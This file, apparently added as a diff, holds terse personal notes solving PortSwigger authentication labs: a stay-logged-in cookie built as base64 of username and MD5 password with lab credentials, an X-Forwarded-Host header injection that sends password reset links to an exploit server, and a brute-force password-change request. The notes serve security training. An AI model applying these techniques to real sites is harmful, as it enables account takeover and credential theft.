@@ -1,0 +1,25 @@
+Link: https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking
+
+
+stay loged in cookie: base64(username:md5(password))
+
+        base64(wiener:md5(peter))
+
+
+
+        base64(carlos:md5(onceuponatime))
+
+
+
+
+LAB - 11
+Link: https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware
+
+Header injection
+    X-Forwarded-Host: exploit-0a12004703aef4c3803625ea01ed00f0.exploit-server.net
+
+
+LAB -12
+Link: https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change
+
+username=carlos&current-password=qwertyuiop
